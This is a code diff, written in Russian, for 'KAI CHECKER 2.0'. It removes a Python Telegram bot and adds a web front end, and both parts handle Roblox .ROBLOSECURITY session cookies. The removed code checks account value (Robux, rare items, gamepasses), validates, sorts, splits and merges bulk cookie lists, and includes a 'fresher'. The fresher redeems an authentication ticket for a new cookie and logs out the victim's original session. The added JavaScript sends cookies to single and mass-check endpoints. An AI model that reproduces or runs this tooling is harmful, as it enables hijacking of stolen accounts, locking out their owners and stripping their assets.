-            game_total = sum(p['price'] for p in passes)
-            r += f"║  🎮 {game} (⏣ {game_total:,}):\n"
-            for p in passes[:5]:
-                r += f"║      └ {p['name']} — ⏣ {p['price']:,}\n"
-            if len(passes) > 5:
-                r += f"║      └ ...и ещё {len(passes)-5}\n"
-    else:
-        r += f"║  ❌ Нет геймпассов\n"
-    
-    rare = info.get('RareItems', [])
-    if rare:
-        r += f"╠══════════════════════════════════════════════════════════╣\n"
-        r += f"║  💎 РЕДКИЕ ПРЕДМЕТЫ ({len(rare)} шт):\n"
-        for item in rare[:10]:
-            r += f"║    └ {item['name']} (⏣ {item['rap']:,})\n"
-    
-    r += f"╚══════════════════════════════════════════════════════════╝\n\n"
-    r += f"🍪 COOKIE:\n{info.get('Cookie', '')}"
-    return r
-
-def save_txt(info):
-    un = re.sub(r'[<>:"/\\|?*]', '_', str(info.get('Username', '?')))
-    fn = f"roblox_{un}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-    with open(fn, 'w', encoding='utf-8') as f:
-        f.write(generate_full_txt_report(info))
-    return fn
-
-# ============================================================
-# ФРЕШЕР
-# ============================================================
-
-async def refresh_roblox_cookie(old_cookie: str, kill_old: bool = True) -> tuple[bool, str, str]:
-    if not HAS_CFFI:
-        return False, None, "❌ Установите curl_cffi"
-    logs = []
-    headers_base = {
-        "Cookie": f".ROBLOSECURITY={old_cookie.strip()}",
-        "User-Agent": "Mozilla/5.0",
-        "Origin": "https://www.roblox.com",
-        "Referer": "https://www.roblox.com/"
-    }
-    async with AsyncSession(impersonate="chrome120") as session:
-        r_csrf = await session.post("https://auth.roblox.com/v2/logout", headers=headers_base, timeout=8)
-        csrf_token = r_csrf.headers.get("x-csrf-token")
-        if not csrf_token:
-            return False, None, "❌ Не удалось получить CSRF token"
-        ticket_headers = headers_base.copy()
-        ticket_headers.update({
-            "x-csrf-token": csrf_token,
-            "RBXAuthenticationNegotiation": "1",
-            "Content-Type": "application/json"
-        })
-        r_ticket = await session.post("https://auth.roblox.com/v1/authentication-ticket", headers=ticket_headers, json={}, timeout=8)
-        ticket = r_ticket.headers.get("rbx-authentication-ticket")
-        if not ticket:
-            return False, None, "❌ Ошибка генерации ticket"
-        redeem_headers = {
-            "User-Agent": "Roblox/WinInet",
-            "RBXAuthenticationNegotiation": "1",
-            "Content-Type": "application/json"
+function setupDragAndDrop(areaId, inputId, infoId) {
+    var area = document.getElementById(areaId);
+    var input = document.getElementById(inputId);
+    var info = document.getElementById(infoId);
+    if(!area || !input) return;
+    ['dragenter', 'dragover'].forEach(function(e) { area.addEventListener(e, function(prev) { prev.preventDefault(); area.classList.add('drag-over'); }); });
+    ['dragleave', 'drop'].forEach(function(e) { area.addEventListener(e, function(prev) { prev.preventDefault(); area.classList.remove('drag-over'); }); });
+    area.addEventListener('drop', function(e) {
+        if(e.dataTransfer.files.length) {
+            input.files = e.dataTransfer.files;
+            if(info) info.textContent = 'Выбрано файлов: ' + input.files.length + ' (' + input.files[0].name + ')';
         }
-        r_redeem = await session.post("https://auth.roblox.com/v1/authentication-ticket/redeem", headers=redeem_headers, json={"authenticationTicket": ticket}, timeout=8)
-        new_cookie = None
-        set_cookie_hdr = r_redeem.headers.get("set-cookie", "")
-        if ".ROBLOSECURITY=" in set_cookie_hdr:
-            parts = set_cookie_hdr.split(".ROBLOSECURITY=")
-            if len(parts) > 1:
-                new_cookie = parts[1].split(";")[0]
-        if not new_cookie or new_cookie == old_cookie:
-            return False, None, "❌ Не удалось извлечь новый кук"
-        if kill_old:
-            await session.post("https://auth.roblox.com/v2/logout", headers=ticket_headers, timeout=4)
-            logs.append("✅ Старая сессия инвалидирована")
-        else:
-            logs.append("ℹ️ Старая сессия сохранена")
-        return True, new_cookie, "\n".join(logs)
+    });
+    input.addEventListener('change', function() {
+        if(this.files.length && info) {
+            info.textContent = 'Выбрано файлов: ' + this.files.length + ' (' + this.files[0].name + ')';
+        }
+    });
+}
+setupDragAndDrop('massDropArea', 'massFile', 'massFileInfo');
+setupDragAndDrop('mergeDropArea', 'mergeFiles', 'mergeFileInfo');
+setupDragAndDrop('splitDropArea', 'splitFiles', 'splitFileInfo');
 
-def refresh_cookie_sync(cookie: str, kill_old: bool = True) -> tuple[bool, str, str]:
-    loop = None
-    try:
-        if sys.platform == 'win32':
-            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        res = loop.run_until_complete(refresh_roblox_cookie(cookie, kill_old))
-        return res
-    except Exception as e:
-        return False, None, f"[ERROR] {e}"
-    finally:
-        if loop and not loop.is_closed():
-            loop.close()
+function activateTab(tabName) {
+    document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
+    document.querySelectorAll('.tab-content').forEach(function(c) { c.classList.remove('active'); });
+    var targetBtn = document.querySelector('.tab[data-tab="' + tabName + '"]');
+    var targetContent = document.getElementById('tab-' + tabName);
+    if(targetBtn && targetContent) {
+        targetBtn.classList.add('active');
+        targetContent.classList.add('active');
+        localStorage.setItem('kai_active_tab', tabName);
+        if(tabName === 'history') { loadCheckerHistory(); loadFresherHistory(); }
+    }
+}
+document.querySelectorAll('.tab').forEach(function(tab) {
+    tab.addEventListener('click', function() { activateTab(this.dataset.tab); });
+});
+window.addEventListener('DOMContentLoaded', function() {
+    activateTab(localStorage.getItem('kai_active_tab') || 'checker');
+});
 
-def log_check(uid, info):
-    ds = datetime.now().strftime('%d.%m.%Y')
-    with open(f"data/logs/checks_{ds}.txt", 'a', encoding='utf-8') as f:
-        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {info.get('status', '?')} | {info.get('Username', '?')} | ⏣ {info.get('Robux', 0):,}\n")
+async function runSingleCheck() {
+    var cookie = document.getElementById('singleCookie').value.trim();
+    if(!cookie) return showAlert('Вставьте кук!');
+    document.getElementById('singleContainer').style.display = 'block';
+    document.getElementById('singleResult').style.display = 'block';
+    document.getElementById('btnToggle_singleResult').textContent = '▼ Свернуть';
+    document.getElementById('singleResult').textContent = '⏳ Проверка...';
+    try {
+        var res = await fetch('/api/single-check', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookie: cookie}) });
+        var data = await res.json();
+        document.getElementById('singleResult').textContent = data.report || 'Ошибка';
+    } catch(e) {
+        showAlert('Ошибка соединения');
+        document.getElementById('singleResult').textContent = '❌ Ошибка соединения';
+    }
+}
 
-# ============================================================
-# КЛАСС ПОЛЬЗОВАТЕЛЯ
-# ============================================================
-
-class UserStats:
-    def __init__(self, uid):
-        self.uid = uid
-        self.tc = 0
-        self.v = 0
-        self.iv = 0
-        self.b = 0
-        self.tr = 0
-        self.td = 0
-        self.st = datetime.now()
-        self.ca = []
-        self.pf = f"data/profiles/{uid}.json"
-        self.load()
-
-    def save(self):
-        d = {'uid': self.uid, 'tc': self.tc, 'v': self.v, 'iv': self.iv,
-             'b': self.b, 'tr': self.tr, 'td': self.td,
-             'st': self.st.isoformat(), 'ca': self.ca[-50:]}
-        try:
-            json.dump(d, open(self.pf, 'w', encoding='utf-8'), ensure_ascii=False, indent=2)
-        except:
-            pass
-
-    def load(self):
-        try:
-            if os.path.exists(self.pf):
-                d = json.load(open(self.pf, 'r', encoding='utf-8'))
-                self.tc, self.v, self.iv = d.get('tc', 0), d.get('v', 0), d.get('iv', 0)
-                self.b, self.tr, self.td = d.get('b', 0), d.get('tr', 0), d.get('td', 0)
-                self.st = datetime.fromisoformat(d.get('st', datetime.now().isoformat()))
-                self.ca = d.get('ca', [])
-        except:
-            pass
-
-    def add(self, r):
-        self.tc += 1
-        if '✅' in r.get('status', ''):
-            self.v += 1
-            self.tr += r.get('Robux', 0)
-            self.td += abs(r.get('OutgoingRobuxYear', 0))
-            self.ca.append({'u': r.get('Username', '?'), 'r': r.get('Robux', 0), 't': datetime.now().strftime('%d.%m.%Y %H:%M')})
-        elif '🚫' in r.get('status', ''):
-            self.b += 1
-        else:
-            self.iv += 1
-        self.save()
-
-    def get_stats(self):
-        u = datetime.now() - self.st
-        d = u.days
-        h = u.seconds // 3600
-        m = (u.seconds % 3600) // 60
-        vp = (self.v / self.tc * 100) if self.tc > 0 else 0
-        rc = "\n".join([f"└─ {a['u']} (⏣ {a['r']:,})" for a in self.ca[-5:]]) if self.ca else "└─ Никого"
-        return f"<blockquote><b>👤 ПРОФИЛЬ</b>\n\n⏱ {d}д {h}ч {m}м | 🔍 {self.tc}\n✅ {self.v} ({vp:.0f}%) | ❌ {self.iv} | 🚫 {self.b}\n💰 ⏣ {self.tr:,} | 💸 {self.td:,}\n\n🕒 Последние:\n{rc}</blockquote>"
-
-# ============================================================
-# КЛАСС БОТА
-# ============================================================
-
-class Bot:
-    def __init__(self, token):
-        self.bot = telebot.TeleBot(token)
-        self.waiting = {}
-        self.checking = False
-        self.user_stats = {}
-        self.last_cookie = {}
-        self.setup()
-
-    def get_user_stats(self, uid):
-        if uid not in self.user_stats:
-            self.user_stats[uid] = UserStats(uid)
-        return self.user_stats[uid]
-
-    def is_allowed(self, uid):
-        return uid in ALLOWED_USERS
-
-    def continue_menu(self):
-        kb = telebot.types.InlineKeyboardMarkup(row_width=2)
-        kb.add(
-            telebot.types.InlineKeyboardButton("🔄 Проверить ещё", callback_data="check_again"),
-            telebot.types.InlineKeyboardButton("🏠 В меню", callback_data="menu_back")
-        )
-        return kb
-
-    def main_menu(self):
-        kb = telebot.types.InlineKeyboardMarkup(row_width=2)
-        kb.add(
-            telebot.types.InlineKeyboardButton("🔍 Чекер", callback_data="menu_checker"),
-            telebot.types.InlineKeyboardButton("🔄 Фрешер", callback_data="menu_fresher")
-        )
-        kb.add(
-            telebot.types.InlineKeyboardButton("✅ Валидатор", callback_data="menu_validator"),
-            telebot.types.InlineKeyboardButton("📊 Статистика", callback_data="menu_stats")
-        )
-        kb.add(
-            telebot.types.InlineKeyboardButton("📂 Сортер", callback_data="menu_sorter"),
-            telebot.types.InlineKeyboardButton("✂️ Разделитель", callback_data="menu_split")
-        )
-        kb.add(
-            telebot.types.InlineKeyboardButton("📦 Слияние", callback_data="menu_merge"),
-            telebot.types.InlineKeyboardButton("ℹ️ Инфо", callback_data="menu_info")
-        )
-        return kb
-
-    def back_button(self):
-        return telebot.types.InlineKeyboardMarkup().add(telebot.types.InlineKeyboardButton("◀️ Назад", callback_data="menu_back"))
-
-    def mc(self):
-        return "<b>🔍 KAI CHECKER 2.0</b>\n\n✅ Быстрая проверка куков\n🔄 Фрешер (новый, быстрее)\n✅ Валидатор (отсеивает мёртвые)\n📂 Сортер (по одному в файл)\n✂️ Разделитель (на части)\n📦 Слияние (удаляет дубли)\n📊 Статистика по аккаунтам\n\n<i>Выбери действие в меню ↓</i>"
-
-    def setup(self):
-        @self.bot.message_handler(commands=['start'])
-        def start(msg):
-            if not self.is_allowed(msg.chat.id):
-                return
-            self.waiting.pop(msg.chat.id, None)
-            self.bot.send_photo(msg.chat.id, LOGO_URL, caption=self.mc(), reply_markup=self.main_menu(), parse_mode='HTML')
-
-        @self.bot.callback_query_handler(func=lambda call: True)
-        def hc(call):
-            if not self.is_allowed(call.message.chat.id):
-                return
-            cid = call.message.chat.id
-            mid = call.message.message_id
-
-            if call.data == "check_again":
-                self.waiting[cid] = 'checker'
-                self.bot.edit_message_text(
-                    "<b>🔍 ЧЕКЕР</b>\n<blockquote>📨 Отправь кук</blockquote>",
-                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
-                )
-                return
-
-            if call.data.startswith("retry_"):
-                mode = call.data.replace("retry_", "")
-                cookie = self.last_cookie.get(cid)
-                if not cookie:
-                    self.bot.edit_message_text("❌ Нет кука.", chat_id=cid, message_id=mid)
-                    return
-                self.checking = False
-                try:
-                    self.bot.delete_message(cid, mid)
-                except:
-                    pass
-                if mode == "fresher":
-                    self.process_fresher(call.message, cookie)
-                return
-
-            if call.data == "menu_checker":
-                self.waiting[cid] = 'checker'
-                self.bot.edit_message_caption(
-                    "<b>🔍 ЧЕКЕР</b>\n<blockquote>📨 Отправь кук</blockquote>",
-                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
-                )
-            elif call.data == "menu_fresher":
-                self.waiting[cid] = 'fresher'
-                self.bot.edit_message_caption(
-                    "<b>🔄 ФРЕШЕР</b>\n<blockquote>📨 Отправь кук\n⚠️ Старая кука сломается!</blockquote>",
-                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
-                )
-            elif call.data == "menu_validator":
-                self.waiting[cid] = 'validator'
-                self.bot.edit_message_caption(
-                    "<b>✅ ВАЛИДАТОР</b>\n<blockquote>📨 Отправь .txt файл с куками</blockquote>",
-                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
-                )
-            elif call.data == "menu_stats":
-                self.waiting.pop(cid, None)
-                self.bot.edit_message_caption(
-                    self.get_user_stats(str(cid)).get_stats(),
-                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
-                )
-            elif call.data == "menu_sorter":
-                self.waiting[cid] = 'sorter'
-                self.bot.edit_message_caption(
-                    "<b>📂 СОРТЕР</b>\n<blockquote>📨 Отправь .txt файл с куками\nЯ разобью их по одному в файл</blockquote>",
-                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
-                )
-            elif call.data == "menu_split":
-                self.waiting[cid] = 'split'
-                self.bot.edit_message_caption(
-                    "<b>✂️ РАЗДЕЛИТЕЛЬ</b>\n<blockquote>📨 Отправь .txt файл с куками\nЯ разделю его на 5 частей</blockquote>",
-                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
-                )
-            elif call.data == "menu_merge":
-                self.waiting[cid] = 'merge'
-                self.bot.edit_message_caption(
-                    "<b>📦 СЛИЯНИЕ</b>\n<blockquote>📨 Отправь несколько .txt файлов\nЯ соединю их в один и удалю дубли</blockquote>",
-                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
-                )
-            elif call.data == "menu_info":
-                self.waiting.pop(cid, None)
-                self.bot.edit_message_caption(
-                    "<b>ℹ️ ИНФО</b>\n<blockquote>🤖 KAI CHECKER 2.0\n\n📊 Что умеет:\n├─ 🔍 Быстрая проверка куков\n├─ 🔄 Фрешер (быстрый)\n├─ ✅ Валидатор\n├─ 📂 Сортер (по одному)\n├─ ✂️ Разделитель (на части)\n├─ 📦 Слияние (удаляет дубли)\n├─ 👤 Профиль\n└─ 💾 Статистика</blockquote>",
-                    chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML'
-                )
-            elif call.data == "menu_back":
-                self.waiting.pop(cid, None)
-                try:
-                    self.bot.edit_message_caption(caption=self.mc(), chat_id=cid, message_id=mid,
-                                                  reply_markup=self.main_menu(), parse_mode='HTML')
-                except:
-                    self.bot.send_photo(cid, LOGO_URL, caption=self.mc(), reply_markup=self.main_menu(), parse_mode='HTML')
-
-        @self.bot.message_handler(content_types=['document'])
-        def hf(msg):
-            if not self.is_allowed(msg.chat.id):
-                return
-            if self.checking:
-                self.bot.reply_to(msg, "⏳ Подожди...")
-                return
-            
-            mode = self.waiting.get(msg.chat.id, 'checker')
-            
-            try:
-                if not msg.document.file_name.endswith('.txt'):
-                    self.bot.reply_to(msg, "❌ Только .txt")
-                    return
-                
-                fi = self.bot.get_file(msg.document.file_id)
-                dw = self.bot.download_file(fi.file_path)
-                ct = dw.decode('utf-8', errors='ignore')
-                
-                if mode == 'validator':
-                    cookies = extract_cookies(ct)
-                    if not cookies:
-                        self.bot.reply_to(msg, "❌ Не найдены куки в файле")
-                        return
-                    self.process_validator(msg, cookies)
-                elif mode == 'sorter':
-                    cookies = extract_cookies(ct)
-                    if not cookies:
-                        self.bot.reply_to(msg, "❌ Куки не найдены")
-                        return
-                    self.process_sorter(msg, cookies)
-                elif mode == 'split':
-                    cookies = extract_cookies(ct)
-                    if not cookies:
-                        self.bot.reply_to(msg, "❌ Куки не найдены")
-                        return
-                    self.process_split(msg, cookies)
-                else:
-                    cks = extract_cookies(ct)[:5]
-                    if not cks:
-                        self.bot.reply_to(msg, "❌ Не найдены куки")
-                        return
-                    self.waiting.pop(msg.chat.id, None)
-                    self.bulk_check(msg, cks)
-            except Exception as e:
-                self.bot.reply_to(msg, f"❌ {e}")
-
-        @self.bot.message_handler(func=lambda m: True)
-        def ht(msg):
-            if not self.is_allowed(msg.chat.id):
-                return
-            if self.checking:
-                self.bot.reply_to(msg, "⏳ Подожди...")
-                return
-
-            mode = self.waiting.get(msg.chat.id, 'checker')
-            
-            # Обработка слияния
-            if mode == 'merge':
-                if msg.document and msg.document.file_name.endswith('.txt'):
-                    self.process_merge_single(msg)
-                else:
-                    self.bot.reply_to(msg, "📦 Отправь .txt файл с куками\nЯ буду ждать следующие файлы...")
-                    self.waiting[msg.chat.id] = 'merge_collect'
-                    self.merge_files = []
-                    self.merge_files.append(msg.document)
-                return
-            
-            if mode == 'merge_collect':
-                if msg.document and msg.document.file_name.endswith('.txt'):
-                    if not hasattr(self, 'merge_files'):
-                        self.merge_files = []
-                    self.merge_files.append(msg.document)
-                    self.bot.reply_to(msg, f"📦 Файл принят ({len(self.merge_files)}). Отправь ещё или нажми /done")
-                return
-            
-            cks = extract_cookies(msg.text)
-            
-            if cks:
-                self.waiting.pop(msg.chat.id, None)
-                if mode == 'fresher':
-                    self.process_fresher(msg, cks[0])
-                else:
-                    self.single_check(msg, cks[0])
-            else:
-                self.bot.send_photo(msg.chat.id, LOGO_URL, caption=self.mc(), reply_markup=self.main_menu(), parse_mode='HTML')
-
-        @self.bot.message_handler(commands=['done'])
-        def done_merge(msg):
-            if not self.is_allowed(msg.chat.id):
-                return
-            if hasattr(self, 'merge_files') and len(self.merge_files) >= 2:
-                self.process_merge_files(msg)
-            else:
-                self.bot.reply_to(msg, "❌ Нужно минимум 2 файла для слияния")
-
-    # ============================================================
-    # ЧЕКЕР
-    # ============================================================
-
-    def single_check(self, msg, cookie):
-        self.checking = True
-        st = self.bot.reply_to(msg, "🔍 Быстрая проверка...")
-        info = get_full_info(cookie)
-        uid = str(msg.chat.id)
-        self.get_user_stats(uid).add(info)
-        log_check(uid, info)
-        
-        report = format_short_report(info)
-        try:
-            self.bot.edit_message_text(report, chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML')
-        except:
-            clean_report = report.replace("<blockquote>", "").replace("</blockquote>", "")
-            self.bot.edit_message_text(clean_report, chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML')
-        
-        fn = save_txt(info)
-        with open(fn, 'rb') as f:
-            self.bot.send_document(msg.chat.id, f, caption=f"📄 Полный отчёт {info.get('Username', '?')}")
-        os.remove(fn)
-        
-        self.bot.send_message(msg.chat.id, "✅ Чек завершен!", reply_markup=self.continue_menu(), parse_mode='HTML')
-        self.checking = False
-
-    def bulk_check(self, msg, cookies):
-        self.checking = True
-        total = len(cookies)
-        st = self.bot.reply_to(msg, f"🔍 Проверяю {total} куков...", parse_mode='HTML')
-        all_info = []
-        uid = str(msg.chat.id)
-        stats = self.get_user_stats(uid)
-        with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
-            fs = [ex.submit(get_full_info, c) for c in cookies]
-            for f in as_completed(fs):
-                try:
-                    info = f.result()
-                    all_info.append(info)
-                    stats.add(info)
-                    log_check(uid, info)
-                except:
-                    pass
-        valid_count = len([i for i in all_info if i.get('status') == '✅'])
-        self.bot.send_message(msg.chat.id, f"<b>📊 ОТЧЕТ</b>\n✅ Валид: {valid_count}/{total}", parse_mode='HTML')
-        
-        for info in all_info:
-            if info.get('status') == '✅':
-                try:
-                    fn = save_txt(info)
-                    with open(fn, 'rb') as f:
-                        self.bot.send_document(msg.chat.id, f, caption=f"📄 Полный отчёт {info.get('Username', '?')}")
-                    os.remove(fn)
-                except:
-                    pass
-        self.bot.send_message(msg.chat.id, "✅ Чек завершен!", reply_markup=self.continue_menu(), parse_mode='HTML')
-        self.checking = False
-
-    # ============================================================
-    # ФРЕШЕР
-    # ============================================================
-
-    def process_fresher(self, msg, cookie):
-        self.checking = True
-        self.last_cookie[msg.chat.id] = cookie
-        st = self.bot.reply_to(msg, "🔄 Фрешер...", parse_mode='HTML')
-
-        def do():
-            try:
-                ok, new_cookie, log_text = refresh_cookie_sync(cookie)
-                
-                if ok:
-                    self.bot.edit_message_text(
-                        f"<b>🔄 ✅ ФРЕШЕР УСПЕШЕН!</b>\n\n"
-                        f"<blockquote>📋 Новая кука:\n"
-                        f"<code>{new_cookie}</code></blockquote>",
-                        chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML'
-                    )
-                    filename = f"fresh_cookie_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-                    with open(filename, "w", encoding="utf-8") as f:
-                        f.write(new_cookie)
-                    with open(filename, "rb") as f:
-                        self.bot.send_document(msg.chat.id, f, caption="📄 Новая кука")
-                    os.remove(filename)
-                else:
-                    self.bot.edit_message_text(
-                        f"<b>❌ ОШИБКА ФРЕШЕРА</b>\n\n{log_text}",
-                        chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML'
-                    )
-                
-                log_filename = f"fresh_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-                with open(log_filename, "w", encoding="utf-8") as f:
-                    f.write(log_text)
-                with open(log_filename, "rb") as f:
-                    self.bot.send_document(msg.chat.id, f, caption="📋 Лог фрешера")
-                os.remove(log_filename)
-                
-            except Exception as e:
-                self.bot.edit_message_text(
-                    f"<b>❌ ОШИБКА</b>\n\n{str(e)}",
-                    chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML'
-                )
-            finally:
-                self.checking = False
-
-        import threading
-        threading.Thread(target=do).start()
-
-    # ============================================================
-    # ВАЛИДАТОР
-    # ============================================================
-
-    def process_validator(self, msg, cookies):
-        self.checking = True
-        st = self.bot.reply_to(msg, f"✅ Проверяю {len(cookies)} куков...", parse_mode='HTML')
-        
-        def do():
-            try:
-                valid = []
-                invalid = []
-                for c in cookies:
-                    s = create_session(c)
-                    r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=3, verify=False)
-                    if r.status_code == 200:
-                        valid.append(c)
-                    else:
-                        invalid.append(c)
-                
-                self.bot.edit_message_text(
-                    f"<b>✅ ВАЛИДАЦИЯ ЗАВЕРШЕНА</b>\n\n"
-                    f"Всего: {len(cookies)}\n"
-                    f"✅ Валидных: {len(valid)}\n"
-                    f"❌ Невалидных: {len(invalid)}",
-                    chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML'
-                )
-                
-                if valid:
-                    filename = f"valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-                    with open(filename, "w", encoding="utf-8") as f:
-                        f.write('\n'.join(valid))
-                    with open(filename, "rb") as f:
-                        self.bot.send_document(msg.chat.id, f, caption="📄 Валидные куки")
-                    os.remove(filename)
-                
-            except Exception as e:
-                self.bot.edit_message_text(
-                    f"<b>❌ ОШИБКА</b>\n\n{str(e)}",
-                    chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML'
-                )
-            finally:
-                self.checking = False
-        
-        import threading
-        threading.Thread(target=do).start()
-
-    # ============================================================
-    # СОРТЕР
-    # ============================================================
-
-    def process_sorter(self, msg, cookies):
-        self.checking = True
-        st = self.bot.reply_to(msg, f"📂 Сортирую {len(cookies)} куков...")
-        
-        def do():
-            try:
-                zip_buffer = BytesIO()
-                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
-                    for i, cookie in enumerate(cookies[:50]):
-                        zf.writestr(f"cookie_{i+1}.txt", cookie)
-                
-                zip_buffer.seek(0)
-                self.bot.edit_message_text(
-                    f"✅ Сортировка завершена!\n📦 {len(cookies[:50])} файлов в ZIP",
-                    chat_id=msg.chat.id, message_id=st.message_id
-                )
-                self.bot.send_document(msg.chat.id, zip_buffer, caption="📦 Сортированные куки")
-                
-            except Exception as e:
-                self.bot.edit_message_text(f"❌ Ошибка: {e}", chat_id=msg.chat.id, message_id=st.message_id)
-            finally:
-                self.checking = False
-                self.waiting.pop(msg.chat.id, None)
-        
-        threading.Thread(target=do).start()
-
-    # ============================================================
-    # РАЗДЕЛИТЕЛЬ
-    # ============================================================
-
-    def process_split(self, msg, cookies):
-        self.checking = True
-        st = self.bot.reply_to(msg, f"✂️ Разделяю {len(cookies)} куков...")
-        
-        def do():
-            try:
-                parts = 5
-                chunk_size = max(1, len(cookies) // parts)
-                chunks = [cookies[i:i+chunk_size] for i in range(0, len(cookies), chunk_size)]
-                
-                zip_buffer = BytesIO()
-                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
-                    for i, chunk in enumerate(chunks[:5]):
-                        zf.writestr(f"part_{i+1}.txt", '\n'.join(chunk))
-                
-                zip_buffer.seek(0)
-                self.bot.edit_message_text(
-                    f"✅ Разделение завершено!\n📦 {len(chunks[:5])} частей в ZIP",
-                    chat_id=msg.chat.id, message_id=st.message_id
-                )
-                self.bot.send_document(msg.chat.id, zip_buffer, caption="📦 Разделённые куки")
-                
-            except Exception as e:
-                self.bot.edit_message_text(f"❌ Ошибка: {e}", chat_id=msg.chat.id, message_id=st.message_id)
-            finally:
-                self.checking = False
-                self.waiting.pop(msg.chat.id, None)
-        
-        threading.Thread(target=do).start()
-
-    # ============================================================
-    # СЛИЯНИЕ
-    # ============================================================
-
-    def process_merge_single(self, msg):
-        if not hasattr(self, 'merge_files'):
-            self.merge_files = []
-        self.merge_files.append(msg.document)
-        self.bot.reply_to(msg, f"📦 Файл принят ({len(self.merge_files)}). Отправь ещё или нажми /done")
-
-    def process_merge_files(self, msg):
-        self.checking = True
-        st = self.bot.reply_to(msg, f"📦 Сливаю {len(self.merge_files)} файлов...")
-        
-        def do():
-            try:
-                all_cookies = []
-                filenames = []
-                
-                for doc in self.merge_files:
-                    if not doc.file_name.endswith('.txt'):
-                        continue
-                    fi = self.bot.get_file(doc.file_id)
-                    dw = self.bot.download_file(fi.file_path)
-                    ct = dw.decode('utf-8', errors='ignore')
-                    cookies = extract_cookies(ct)
-                    all_cookies.extend(cookies)
-                    filenames.append(doc.file_name)
-                
-                if not all_cookies:
-                    self.bot.edit_message_text("❌ Куки не найдены в файлах", chat_id=msg.chat.id, message_id=st.message_id)
-                    self.checking = False
-                    return
-                
-                unique_cookies = list(dict.fromkeys(all_cookies))
-                
-                filename = f"merged_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-                with open(filename, 'w', encoding='utf-8') as f:
-                    f.write('\n'.join(unique_cookies))
-                
-                self.bot.edit_message_text(
-                    f"✅ Слияние завершено!\n"
-                    f"📁 Файлов: {len(filenames)}\n"
-                    f"📦 Всего куков: {len(unique_cookies)}\n"
-                    f"🔄 Дублей удалено: {len(all_cookies) - len(unique_cookies)}",
-                    chat_id=msg.chat.id, message_id=st.message_id
-                )
-                
-                with open(filename, 'rb') as f:
-                    self.bot.send_document(msg.chat.id, f, caption="📦 Слитые куки")
-                os.remove(filename)
-                
-            except Exception as e:
-                self.bot.edit_message_text(f"❌ Ошибка: {e}", chat_id=msg.chat.id, message_id=st.message_id)
-            finally:
-                self.checking = False
-                self.waiting.pop(msg.chat.id, None)
-                self.merge_files = []
-        
-        threading.Thread(target=do).start()
-
-    def run(self):
-        logger.info("🤖 KAI CHECKER 2.0")
-        print("🤖 Бот запущен!")
-        while True:
-            try:
-                self.bot.polling(none_stop=True, timeout=30)
-            except Exception as e:
-                logger.error(f"Polling error: {e}")
-                time.sleep(5)
-
-# ============================================================
-# ЗАПУСК
-# ============================================================
-
-def run_bot():
-    bot = Bot(TELEGRAM_BOT_TOKEN)
-    bot.run()
-
-if __name__ == "__main__":
-    # Запускаем бота в фоновом потоке
-    bot_thread = threading.Thread(target=run_bot, daemon=True)
-    bot_thread.start()
+async function runMassCheck() {
+    var file = document.getElementById('massFile').files[0];
+    if(!file) return showAlert('Выберите TXT файл!');
     
-    # Запускаем Flask для Render
-    port = int(os.environ.get("PORT", 5000))
-    print(f"🌐 Flask запущен на порту {port}")
-    app.run(host='0.0.0.0', port=port)
+    var btn = document.getElementById('massBtn');
+    var progress = document.getElementById('massProgress');
+    var progressText = document.getElementById('massProgressText');
+    var resultBox = document.getElementById('massResult');
+    var container = document.getElementById('massContainer');
+    
+    btn.disabled = true;
+    btn.textContent = '⏳ Проверка...';
+    progress.style.width = '50%';
+    progressText.textContent = '⏳ Обработка...';
+    container.style.display = 'block';
+    resultBox.style.display = 'block';
+    resultBox.textContent = '⏳ Массовая проверка...';
+    document.getElementById('btnToggle_massResult').textContent = '▼ Свернуть';
+    lastMassReports = [];
+    
+    var fd = new FormData();
+    fd.append('file', file);
+    
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 90000);
+    
+    try {
+        var res = await fetch('/api/mass-check', { method: 'POST', body: fd, signal: controller.signal });
+        clearTimeout(timeoutId);
+        var data = await res.json();
+        
+        progress.style.width = '100%';
+        progressText.textContent = '✅ Готово!';
+        btn.disabled = false;
+        btn.textContent = '🚀 Запустить массовый чек';
+        
+        if(data.success) {
+            resultBox.textContent = data.message;
+            document.getElementById('statValid').textContent = data.valid_count || 0;
+            document.getElementById('statRobux').textContent = (data.total_robux || 0).toLocaleString();
+            document.getElementById('statPremium').textContent = data.premium_count || 0;
+            if (data.reports) {
+                lastMassReports = data.reports;
+            }
+        } else {
+            showAlert(data.message || 'Ошибка');
+        }
+    } catch(e) {
+        clearTimeout(timeoutId);
+        if (e.name === 'AbortError') {
+            showAlert('Превышено время ожидания ответа от сервера (Timeout)');
+        } else {
+            showAlert('Ошибка соединения');
+        }
+        btn.disabled = false;
